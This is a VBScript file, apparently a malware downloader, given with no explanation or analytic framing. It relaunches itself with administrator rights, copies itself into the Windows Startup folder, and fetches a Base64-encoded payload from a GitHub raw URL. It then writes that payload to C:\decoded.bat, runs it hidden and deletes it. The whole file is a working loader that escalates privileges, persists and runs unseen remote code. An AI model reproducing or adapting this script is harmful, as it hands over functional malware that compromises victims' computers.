' Check if running as administrator
If Not WScript.Arguments.Named.Exists("elevated") Then
    Set objShell = CreateObject("Shell.Application")
    ' Relaunch the script as Administrator
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
    WScript.Quit
End If

' Create necessary objects
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Add this script to Windows Startup
startupFolderPath = objShell.SpecialFolders("Startup")
scriptName = objFSO.GetFileName(WScript.ScriptFullName)
startupScriptPath = startupFolderPath & "\" & scriptName

' Copy the script to the Startup folder if not already there
If Not objFSO.FileExists(startupScriptPath) Then
    objFSO.CopyFile WScript.ScriptFullName, startupScriptPath
End If

' Define the URL of the encoded file
encodedFileUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encoded.txt"
decodedFilePath = "C:\decoded.bat"

' Error handling wrapper
On Error Resume Next

' Create XMLHTTP object to fetch the file
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "GET", encodedFileUrl, False
objXMLHTTP.Send

If Err.Number <> 0 Then
    MsgBox "Error: Failed to create XMLHTTP object or send request. Please check your network connection.", vbCritical, "Error"
    WScript.Quit
End If

' Check if the request was successful
If objXMLHTTP.Status = 200 Then
    ' Get the Base64 encoded content from the response
    encodedContent = objXMLHTTP.responseText

    ' Decode the Base64 string
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("tmp")
    objNode.dataType = "bin.base64"
    objNode.Text = encodedContent
    decodedContent = objNode.nodeTypedValue

    ' Write the decoded content to a temporary batch file
    Set objFile = objFSO.CreateTextFile(decodedFilePath, True)
    objFile.Write decodedContent
    objFile.Close

    ' Run the batch file silently in the background (no user interaction needed)
    objShell.Run Chr(34) & decodedFilePath & Chr(34), 0, True

    ' Clean up by deleting the temporary decoded batch file
    If objFSO.FileExists(decodedFilePath) Then
        objFSO.DeleteFile(decodedFilePath)
    End If
Else
    ' Handle failure in downloading the file
    MsgBox "Error: Failed to download the encoded file. Please check the URL or your network connection.", vbCritical, "Error"
End If
